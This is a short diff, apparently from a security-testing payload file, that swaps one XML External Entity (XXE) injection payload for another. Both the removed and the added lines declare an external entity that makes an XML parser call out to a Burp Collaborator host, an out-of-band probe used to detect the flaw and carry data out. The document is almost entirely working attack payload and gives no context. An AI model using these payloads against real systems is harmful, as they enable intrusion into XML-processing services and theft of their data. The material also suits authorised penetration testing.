@@ -1,3 +1,3 @@
-Content-Type: text/xml
-
-<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxetestd [<!ENTITY xxetest SYSTEM "http://t0ufu318z2u4oms9afgs6eqxyo4es3.burpcollaborator.net/test.dtd">]><foo>&xxetest;</foo>
+<!DOCTYPE xxe [       
+    <!ENTITY externalEntity SYSTEM “http://5lrv679ah7x7n0ww47r20kgca3gt4i.burpcollaborator.net”>
+]>
